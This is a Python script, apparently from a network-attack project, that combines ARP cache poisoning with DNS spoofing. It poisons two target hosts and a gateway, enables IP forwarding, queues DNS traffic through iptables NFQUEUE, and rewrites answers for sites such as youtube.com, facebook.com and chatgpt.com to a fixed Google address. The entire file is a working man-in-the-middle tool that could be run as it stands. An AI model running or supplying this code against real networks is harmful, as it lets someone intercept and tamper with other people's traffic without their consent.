from scapy.all import *
from netfilterqueue import NetfilterQueue
import os
import signal
import sys
import time
import logging
from datetime import datetime

# Import centralized configuration
from config import NetworkConfig, AttackConfig, SecurityConfig, PathConfig, DeviceRegistry

# Suppress Scapy warnings
import warnings
warnings.filterwarnings("ignore", message=".*Ethernet destination MAC address.*")

# DNS Configuration
DNS_PORT = 53
GOOGLE_IP = "142.250.77.142"  # Google's public IP

# Domains to redirect to Google
REDIRECT_DOMAINS = [
    'youtube.com',
    'facebook.com', 
    'instagram.com',
    'twitter.com',
    'x.com',
    'tiktok.com',
    'chatgpt.com'
]

# Use configuration values
target_1 = AttackConfig.POISON_TARGET_1
target_2 = AttackConfig.POISON_TARGET_2  
gateway_device = AttackConfig.GATEWAY_DEVICE
interface = NetworkConfig.INTERFACE

# Setup detailed logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('dns_attack.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

def should_redirect_domain(domain):
    """Check if a domain should be redirected to Google"""
    domain_lower = domain.lower()
    for redirect_domain in REDIRECT_DOMAINS:
        if redirect_domain in domain_lower:
            return True
    return False

def modify_dns_response(packet_data):
    """Modify DNS response to redirect specific domains to Google"""
    try:
        pkt = IP(packet_data)
        
        # Ensure it's a DNS response
        if not (pkt.haslayer(DNS) and pkt[DNS].qr == 1):
            return packet_data, False
        
        dns_layer = pkt[DNS]
        modified = False
        
        # Process each answer
        if dns_layer.ancount > 0:
            # Handle single answer or multiple answers
            answers = dns_layer.an
            if not isinstance(answers, list):
                answers = [answers]
            
            for answer in answers:
                if hasattr(answer, 'type') and answer.type == 1:  # A record
                    try:
                        domain = answer.rrname.decode('utf-8').rstrip('.')
                        original_ip = answer.rdata
                        
                        logger.info(f"[DNS-ANSWER] {domain} -> {original_ip}")
                        
                        if should_redirect_domain(domain):
                            logger.warning(f"[DNS-REDIRECT] 🎯 {domain}: {original_ip} -> {GOOGLE_IP}")
                            answer.rdata = GOOGLE_IP
                            modified = True
                        else:
                            logger.info(f"[DNS-PASS] No redirection for {domain}")
                    except Exception as e:
                        logger.error(f"[DNS-ERROR] Error processing answer: {e}")
        
        if modified:
            # Clear checksums for recalculation
            if pkt.haslayer(IP):
                del pkt[IP].len
                del pkt[IP].chksum
            if pkt.haslayer(UDP):
                del pkt[UDP].len  
                del pkt[UDP].chksum
            
            logger.info(f"[DNS-MODIFY] ✅ DNS response modified successfully")
            return bytes(pkt), True
        
        return packet_data, False
        
    except Exception as e:
        logger.error(f"[DNS-ERROR] Error in modify_dns_response: {e}")
        return packet_data, False

def process_packet(packet):
    """Process intercepted packets"""
    try:
        pkt = IP(packet.get_payload())
        src_ip = pkt.src
        dst_ip = pkt.dst
        
        # Only process UDP DNS packets
        if not (pkt.haslayer(UDP) and (pkt[UDP].sport == 53 or pkt[UDP].dport == 53)):
            packet.accept()
            return
        
        # Check if this involves our target devices
        is_target_traffic = (
            src_ip == target_1.ip or dst_ip == target_1.ip or
            src_ip == target_2.ip or dst_ip == target_2.ip or
            src_ip == gateway_device.ip or dst_ip == gateway_device.ip
        )
        
        if not is_target_traffic:
            packet.accept()
            return
        
        # Only process DNS responses
        if pkt.haslayer(DNS) and pkt[DNS].qr == 1:  # DNS Response
            logger.info(f"[DNS-RESPONSE] 📥 {src_ip} -> {dst_ip}")
            
            # Modify the response
            modified_data, was_modified = modify_dns_response(packet.get_payload())
            
            if was_modified:
                packet.set_payload(modified_data)
                logger.info(f"[DNS-SUCCESS] 🔧 Packet modified and forwarded")
            else:
                logger.info(f"[DNS-PASS] 📤 Packet passed through unchanged")
        
        packet.accept()
        
    except Exception as e:
        logger.error(f"[PACKET-ERROR] Error processing packet: {e}")
        packet.accept()

def enable_ip_forwarding():
    """Enable IP forwarding"""
    logger.info("[SETUP] Enabling IP forwarding")
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_ip_forwarding():
    """Disable IP forwarding"""
    logger.info("[CLEANUP] Disabling IP forwarding")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def setup_iptables():
    """Setup iptables rules for DNS interception"""
    logger.info("[SETUP] Setting up iptables rules")
    
    # Clear existing rules
    os.system("iptables -D FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 2 2>/dev/null")
    os.system("iptables -D FORWARD -p udp --sport 53 -j NFQUEUE --queue-num 2 2>/dev/null")
    
    # Add new rules
    os.system("iptables -I FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 2")
    os.system("iptables -I FORWARD -p udp --sport 53 -j NFQUEUE --queue-num 2")
    
    logger.info("[SETUP] ✅ iptables rules configured")

def cleanup_iptables():
    """Remove iptables rules"""
    logger.info("[CLEANUP] Removing iptables rules")
    os.system("iptables -D FORWARD -p udp --dport 53 -j NFQUEUE --queue-num 2 2>/dev/null")
    os.system("iptables -D FORWARD -p udp --sport 53 -j NFQUEUE --queue-num 2 2>/dev/null")

def poison_arp():
    """Perform ARP poisoning"""
    # Poison Target1 <-> Target2
    send(ARP(op=2, pdst=target_1.ip, hwdst=target_1.mac, psrc=target_2.ip), verbose=False)
    send(ARP(op=2, pdst=target_2.ip, hwdst=target_2.mac, psrc=target_1.ip), verbose=False)
    
    # Poison Target1 <-> Gateway
    send(ARP(op=2, pdst=target_1.ip, hwdst=target_1.mac, psrc=gateway_device.ip), verbose=False)
    send(ARP(op=2, pdst=gateway_device.ip, hwdst=gateway_device.mac, psrc=target_1.ip), verbose=False)
    
    # Poison Target2 <-> Gateway
    send(ARP(op=2, pdst=target_2.ip, hwdst=target_2.mac, psrc=gateway_device.ip), verbose=False)
    send(ARP(op=2, pdst=gateway_device.ip, hwdst=gateway_device.mac, psrc=target_2.ip), verbose=False)

def restore_arp():
    """Restore ARP tables"""
    logger.info("[CLEANUP] Restoring ARP tables")
    
    # Restore Target1
    send(ARP(op=2, pdst=target_1.ip, hwdst=target_1.mac, psrc=target_2.ip, hwsrc=target_2.mac), count=3, verbose=False)
    send(ARP(op=2, pdst=target_1.ip, hwdst=target_1.mac, psrc=gateway_device.ip, hwsrc=gateway_device.mac), count=3, verbose=False)
    
    # Restore Target2
    send(ARP(op=2, pdst=target_2.ip, hwdst=target_2.mac, psrc=target_1.ip, hwsrc=target_1.mac), count=3, verbose=False)
    send(ARP(op=2, pdst=target_2.ip, hwdst=target_2.mac, psrc=gateway_device.ip, hwsrc=gateway_device.mac), count=3, verbose=False)
    
    # Restore Gateway
    send(ARP(op=2, pdst=gateway_device.ip, hwdst=gateway_device.mac, psrc=target_1.ip, hwsrc=target_1.mac), count=3, verbose=False)
    send(ARP(op=2, pdst=gateway_device.ip, hwdst=gateway_device.mac, psrc=target_2.ip, hwsrc=target_2.mac), count=3, verbose=False)

def display_config():
    """Display attack configuration"""
    print("\n" + "="*60)
    print("🔥 SIMPLIFIED DNS INTERCEPTOR")
    print("="*60)
    print(f"🎯 Target 1: {target_1}")
    print(f"🎯 Target 2: {target_2}")
    print(f"🌐 Gateway: {gateway_device}")
    print(f"🔌 Interface: {interface}")
    print(f"🎭 Redirect to: Google ({GOOGLE_IP})")
    print(f"\n📋 Domains to redirect:")
    for domain in REDIRECT_DOMAINS:
        print(f"   • {domain}")
    print("="*60)

def main():
    """Main function"""
    display_config()
    
    logger.info("[ATTACK] 🚀 Starting simplified DNS interceptor")
    
    enable_ip_forwarding()
    setup_iptables()
    
    def cleanup_handler(signum, frame):
        logger.info("\n[CLEANUP] 🧹 Cleaning up...")
        restore_arp()
        cleanup_iptables()
        disable_ip_forwarding()
        logger.info("[CLEANUP] ✅ Cleanup complete")
        sys.exit(0)
    
    signal.signal(signal.SIGINT, cleanup_handler)
    
    # Start ARP poisoning thread
    from threading import Thread
    def arp_poison_loop():
        logger.info("[ARP] 🎯 Starting ARP poisoning")
        count = 0
        while True:
            poison_arp()
            count += 6
            if count % 30 == 0:
                logger.info(f"[ARP] Sent {count} poison packets")
            time.sleep(2)
    
    arp_thread = Thread(target=arp_poison_loop, daemon=True)
    arp_thread.start()
    
    # Start DNS interception
    logger.info("[DNS] 🚀 Starting DNS interception")
    nfqueue = NetfilterQueue()
    nfqueue.bind(2, process_packet)
    
    try:
        nfqueue.run()
    except KeyboardInterrupt:
        logger.info("\n[DNS] 🛑 Stopping...")
    except Exception as e:
        logger.error(f"[DNS] Error: {e}")
    finally:
        nfqueue.unbind()
        cleanup_handler(None, None)

if __name__ == "__main__":
    main() 